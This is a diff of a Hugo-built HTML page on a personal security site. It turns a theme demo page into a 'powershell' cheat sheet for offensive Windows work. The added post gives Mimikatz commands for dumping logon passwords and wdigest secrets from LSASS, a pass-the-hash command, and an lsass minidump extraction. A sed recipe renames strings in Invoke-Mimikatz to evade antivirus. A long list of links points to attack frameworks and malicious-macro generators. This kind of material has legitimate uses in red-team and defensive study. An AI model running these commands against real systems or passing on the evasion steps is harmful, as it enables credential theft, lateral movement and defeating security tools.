@@ -5,21 +5,24 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
-  <title>Bigimg</title>
-  <meta property="og:title" content="Bigimg" />
-  <meta name="twitter:title" content="Bigimg" />
+  <title>powershell</title>
+  <meta property="og:title" content="powershell" />
+  <meta name="twitter:title" content="powershell" />
+  <meta name="description" content="Why skate a half pipe, when you can skate a sewer pipe">
+  <meta property="og:description" content="Why skate a half pipe, when you can skate a sewer pipe">
+  <meta name="twitter:description" content="Why skate a half pipe, when you can skate a sewer pipe">
   <meta name="author" content="GAZ23"/>
   <link href='https://blackvolga.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
   <meta property="og:image" content="https://blackvolga.github.io/img/avatar-icon.png" />
   <meta name="twitter:image" content="https://blackvolga.github.io/img/avatar-icon.png" />
   <meta name="twitter:card" content="summary" />
-  <meta property="og:url" content="https://blackvolga.github.io/tags/bigimg/" />
+  <meta property="og:url" content="https://blackvolga.github.io/intel/powershell/" />
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="BLACKVOLGA" />
 
   <meta name="generator" content="Hugo 0.49" />
-  <link rel="canonical" href="https://blackvolga.github.io/tags/bigimg/" />
-  <link rel="alternate" href="https://blackvolga.github.io/tags/bigimg/index.xml" type="application/rss+xml" title="BLACKVOLGA">
+  <link rel="canonical" href="https://blackvolga.github.io/intel/powershell/" />
+  <link rel="alternate" href="https://blackvolga.github.io/index.xml" type="application/rss+xml" title="BLACKVOLGA">
 
   
   
@@ -168,17 +171,43 @@
 
 
   
+    <div id="header-big-imgs" data-num-img=1 data-img-src-1="https://blackvolga.github.io/img/circuitold.jpg" ></div>
+  
 
-  <header class="header-section ">
+  <header class="header-section has-img">
+    
+      <div class="intro-header big-img">
+        
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+              <div class="intel-heading">
+                <h1>powershell</h1>
+                  
+                    
+                      <h2 class="intel-subheading">Why skate a half pipe, when you can skate a sewer pipe</h2>
+                    
+                  
+                  
+              </div>
+            </div>
+          </div>
+        </div>
+        <span class="img-desc" style="display: inline;"></span>
+      </div>
     
     <div class="intro-header no-img">
       <div class="container">
         <div class="row">
           <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-            <div class="tags-heading">
+            <div class="intel-heading">
               
-                <h1>Bigimg</h1>
+                <h1>powershell</h1>
               
+              
+                
+                  <h2 class="intel-subheading">Why skate a half pipe, when you can skate a sewer pipe</h2>
+                
               
               
             </div>
@@ -190,64 +219,110 @@
 
 
     
-  <div class="container" role="main">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+
+<p><a href="https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz">https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz</a></p>
+
+<p>TLDR:
+<div class="highlight"><pre class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="ln">1</span><span class="p">.\</span><span class="n">mimikatz</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::logonpasswords&#34;</span> <span class="n">exit</span></code></pre></div></p>
+
+<p>extract passwds</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="ln">1</span><span class="n">mimikatz_command</span> <span class="o">-f</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonPasswords</span> <span class="n">full</span>
+<span class="ln">2</span><span class="n">mimikatz_command</span> <span class="o">-f</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">wdigest</span></code></pre></div>
+
+<p>pass the hash (on the left hand side)</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="ln">1</span><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">WOSHUB</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="p">{</span><span class="n">NTLM_hash</span><span class="p">}</span> <span class="p">/</span><span class="n">run</span><span class="err">:</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></pre></div>
+
+<p>mimidawgz (avoid AV detection)</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-Bash" data-lang="Bash"><span class="ln"> 1</span>mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1
+<span class="ln"> 2</span>
+<span class="ln"> 3</span>sed -i -e <span class="s1">&#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&#39;</span> Invoke-MimiDawgz.ps1
+<span class="ln"> 4</span>sed -i -e <span class="s1">&#39;/&lt;#/,/#&gt;/c\\&#39;</span> Invoke-MimiDawgz.ps1
+<span class="ln"> 5</span>
+<span class="ln"> 6</span>sed -i -e <span class="s1">&#39;s/^[[:space:]]*#.*$//g&#39;</span> Invoke-MimiDawgz.ps1
+<span class="ln"> 7</span>
+<span class="ln"> 8</span>sed -i -e <span class="s1">&#39;s/DumpCreds/DumpCred/g&#39;</span> Invoke-MimiDawgz.ps1
+<span class="ln"> 9</span>
+<span class="ln">10</span>sed -i -e <span class="s1">&#39;s/ArgumentPtr/NotTodayPal/g&#39;</span> Invoke-MimiDawgz.ps1
+<span class="ln">11</span>
+<span class="ln">12</span>sed -i -e <span class="s1">&#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&#39;</span> 
+<span class="ln">13</span>Invoke-MimiDawgz.ps1
+<span class="ln">14</span>
+<span class="ln">15</span>sed -i -e <span class="s2">&#34;s/\-Win32Functions \$Win32Functions</span>$<span class="s2">/\-Win32Functions 
+</span><span class="ln">16</span><span class="s2">\$Win32Functions #\-/g&#34;</span> Invoke-MimiDawgz.ps1</code></pre></div>
+
+<p>Ref: <a href="https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/">https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/</a></p>
+
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+
+<p>Extract passwd from Windows memory dump</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="ln">1</span><span class="nb">Get-Process</span> <span class="n">lsass</span> <span class="p">|</span> <span class="nb">Out-Minidump</span><span class="p">`</span>
+<span class="ln">2</span>
+<span class="ln">3</span><span class="n">mimikatz</span> <span class="err">“</span><span class="n">sekurlsa</span><span class="p">::</span><span class="n">minidump</span> <span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span><span class="err">”</span>
+<span class="ln">4</span>
+<span class="ln">5</span><span class="n">mimikatz</span> <span class="c"># sekurlsa::logonPasswords</span></code></pre></div>
+
+<p><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
+
+<p><a href="http://threatexpress.com/2017/05/invoke-hostenum/">http://threatexpress.com/2017/05/invoke-hostenum/</a></p>
+
+<p><a href="http://threatexpress.com/2018/01/hostenum-updates-usage/">http://threatexpress.com/2018/01/hostenum-updates-usage/</a></p>
+
+<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+
+<p><a href="https://github.com/leechristensen/UnmanagedPowerShell">https://github.com/leechristensen/UnmanagedPowerShell</a></p>
+
+<p><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>
+
+<p><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p>
+
+<p><a href="https://github.com/curi0usJack/luckystrike">https://github.com/curi0usJack/luckystrike</a></p>
+
+<p><a href="https://github.com/enigma0x3/Generate-Macro">https://github.com/enigma0x3/Generate-Macro</a></p>
+
+<p><a href="https://github.com/infosecn1nja/MaliciousMacroMSBuild">https://github.com/infosecn1nja/MaliciousMacroMSBuild</a></p>
+
+<p><a href="https://github.com/fireeye/SessionGopher">https://github.com/fireeye/SessionGopher</a></p>
+
+<p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+
+<p><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></p>
+
+<p><a href="https://github.com/JavelinNetworks/HoneypotBuster">https://github.com/JavelinNetworks/HoneypotBuster</a></p>
+
+<p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
+
+<p><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
+
+
         
-        <div class="posts-list">
-          
-            <article class="post-preview">
-              <a href="https://blackvolga.github.io/post/002/">
-                <h2 class="post-title">Big Image Sample</h2>
-
-                
-                  <h3 class="post-subtitle">
-                    Using Multiple Images
-                  </h3>
-                
-              </a>
-
-              <p class="post-meta">
-                <span class="post-meta">
-  
-  
-  <i class="fa fa-calendar-o"></i>&nbsp;Posted on March 7, 2017
-  
-  
-  &nbsp;|&nbsp;
-  <i class="fa fa-clock-o"></i> 1 minutes (191 words)
-  
-  
-</span>
-
-
-              </p>
-              <div class="post-entry">
-                
-                  <p>The image banners at the top of the page are refered to as &ldquo;bigimg&rdquo; in this theme. They are optional, and one more more can be specified. If more than one is specified, the images rotate every 10 seconds. In the front matter, bigimgs are specified using an array of hashes.</p>
-
-<p></p>
-                  <a href="https://blackvolga.github.io/post/002/" class="post-read-more">[Read More]</a>
-                
-              </div>
-
-              
-                <div class="blog-tags">
-                  
-                    <a href="https://blackvolga.github.io/tags/example/">example</a>&nbsp;
-                  
-                    <a href="https://blackvolga.github.io/tags/bigimg/">bigimg</a>&nbsp;
-                  
-                </div>
-              
-
-            </article>
-          
-        </div>
+          <div class="blog-tags">
+            
+              <a href="https://blackvolga.github.io/tags/intel/">intel</a>&nbsp;
+            
+              <a href="https://blackvolga.github.io/tags/windows/">windows</a>&nbsp;
+            
+              <a href="https://blackvolga.github.io/tags/powershell/">powershell</a>&nbsp;
+            
+          </div>
         
-      </div>
+
+        
+      </article>
+
+      
+
     </div>
   </div>
+</div>
 
     <footer>
   <div class="container">
